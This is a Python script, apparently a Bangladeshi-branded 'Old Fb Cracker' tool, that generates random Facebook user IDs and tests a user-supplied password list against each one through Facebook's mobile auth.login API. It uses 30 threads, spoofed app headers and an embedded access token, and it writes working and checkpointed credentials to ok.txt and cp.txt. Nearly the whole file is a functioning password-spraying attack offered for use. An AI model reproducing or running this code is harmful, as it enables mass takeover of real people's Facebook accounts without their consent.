W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		
		print ("""\033[1;92m 
██████ ██████ ███████ ██████     ██          ██ ██████
██            ██            ██        ██ ██         ██ ██          ██ ██
██████ ██████ ███████ ██         ██ ██          ██     ██
██            ██            ██ ██        ██         ██ ██          ██          ██
██            ██████ ██       ██  ██████     ████████ ██████

\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : MD Ferdous Hasan
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSAPP :   +8801892325846
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : ferdousvau1
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mSTATUS  :  PRIMIUAM
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sOld Fb Cracker"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
		print("")
		print("\n    \033[0;92m            UID🔥 CLONING🔥 \033[0;97m ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2004-09 {JUST NOW} %s(7DAYS FREE)"%(G,R,G,Y,B))
		tanya = input("    \033[0;91m(1)\033[0;92m CHOOSE : ")
		if tanya in ["", " "]:
			Main()
		elif tanya in ["1", "01"]:
				    self.fbtua()
		
	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		limit = int(input("    \033[0;91m[+]\033[0;92m TOTAL IDS TO CRACK (LIMIT 50000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [#] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r\r %s[>_] [BY] : %s/%s -> \033[0;92m [ FERDOUS-OK:%s ]- \033[0;91m[FERDOUS-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [FERDOUS-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [FERDOUS-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("   ___________________        \n  /  _____/\_   _____/        \n /   \  ___ |    __)          \n \    \_\  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \______  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/_____/")
		print("\n [*] Author    : MR-HANDSOME")
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/mrhandsome ")
		print(" [*] Instagram : https://instagram.com/mr__handsome__official")
		print(" [*] YouTube   : https://youtube.com/MR-HANDSOME")
		exit(" [*] GitHub    : https://github.com/Handsome209")
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))
